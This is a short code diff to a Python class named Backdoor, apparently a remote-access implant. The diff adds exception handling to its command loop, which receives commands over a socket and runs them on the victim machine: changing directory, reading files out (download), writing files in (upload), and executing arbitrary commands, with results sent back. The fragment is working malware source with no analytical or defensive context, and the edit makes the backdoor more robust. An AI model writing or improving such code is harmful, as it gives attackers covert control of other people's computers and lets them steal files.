@@ -50,17 +50,21 @@ class Backdoor:
     def start(self):
         while True:
             cmd = self.recv_data()
-            if cmd[0] == "cd" and len(cmd) > 1:
-                output = self.execute_cd(cmd[1])
-            elif cmd[0] == "download":
-                output = self.read_file(cmd[1])
-            elif cmd[0] == "upload":
-                output = self.write_file(cmd[1], cmd[2])
-            elif cmd[0] == "exit":
-                self.s.close()
-                exit()
-            else:
-                output = self.execute(cmd)
+            try:
+                if cmd[0] == "cd" and len(cmd) > 1:
+                    output = self.execute_cd(cmd[1])
+                elif cmd[0] == "download":
+                    output = self.read_file(cmd[1])
+                elif cmd[0] == "upload":
+                    output = self.write_file(cmd[1], cmd[2])
+                elif cmd[0] == "exit":
+                    self.s.close()
+                    exit()
+                else:
+                    output = self.execute(cmd)
+            except Exception:
+                output = "[-] ERROR, Invalid command execution."
+
             self.send_data(output)
 
 
